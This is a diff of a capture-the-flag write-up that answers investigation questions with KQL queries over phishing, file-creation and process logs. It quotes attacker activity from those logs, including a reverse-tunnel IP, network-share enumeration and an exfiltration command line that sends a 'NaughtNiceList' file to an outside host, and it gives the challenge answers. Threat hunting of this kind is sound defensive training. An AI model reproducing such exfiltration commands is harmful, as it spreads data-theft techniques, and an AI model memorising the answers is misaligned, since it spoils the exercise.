@@ -11,7 +11,7 @@ How many Craftperson Elf’s are working from laptops?
 
 **25**
 
-Case 1:  
+### Case 1:  
 What is the email address of the employee who received this phishing email?
 
 OutboundNetworkEvents | where url=="http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx" | join (Employees) on $left.src_ip==$right.ip_addr | project email_addr
@@ -42,7 +42,7 @@ Email | where recipient=="alabaster_snowball@santaworkshopgeeseislands.org" | wh
 
   
 
-Case 2:
+### Case 2:
 
 What is the role of our victim in the organization?
 
@@ -68,40 +68,40 @@ Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org
 
   
 
-Case 3:
+### Case 3:
 
 What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!
 
-OutboundNetworkEvents | where url=="http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx" | project timestamp
+`OutboundNetworkEvents | where url=="http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx" | project timestamp`
 
-2023-12-02T10:12:42Z
+**2023-12-02T10:12:42Z**
 
   
 
 What file is dropped to Alabaster's machine shortly after he downloads the malicious file?
 
-Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join FileCreationEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | project filename
+`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join FileCreationEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | project filename`
 
-giftwrap.exe
-
-  
+**giftwrap.exe**
 
   
 
-Case 4:  
+  
+
+### Case 4:  
 The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?
 
-Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join ProcessEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | project process_commandline
+`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join ProcessEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | project process_commandline`
 
-113.37.9.17
+**113.37.9.17**
 
   
 
 What is the timestamp when the attackers enumerated network shares on the machine?
 
-Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join ProcessEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | project timestamp,process_commandline
+`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join ProcessEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | project timestamp,process_commandline`
 
-2023-12-02T16:51:44Z → net share
+**2023-12-02T16:51:44Z → net share
 
   
 
@@ -111,7 +111,7 @@ NorthPolefileshare ("process_commandline": cmd.exe /C net use \\NorthPolefilesha
 
   
 
-Case 5:
+### Case 5:
 
   
 
@@ -148,7 +148,7 @@ downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
 
   
 
-Case 6:
+### Case 6:
 
 What is the name of the executable the attackers used in the final malicious command?
 
@@ -176,5 +176,5 @@ Beware the Cube that Wombles
 
 **Achievement: KQL Kraken Hunt**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTQ4MzgzODEsLTIwMTAxOTI2M119
+eyJoaXN0b3J5IjpbLTc2NjI2NTk2OSwtMjAxMDE5MjYzXX0=
 -->
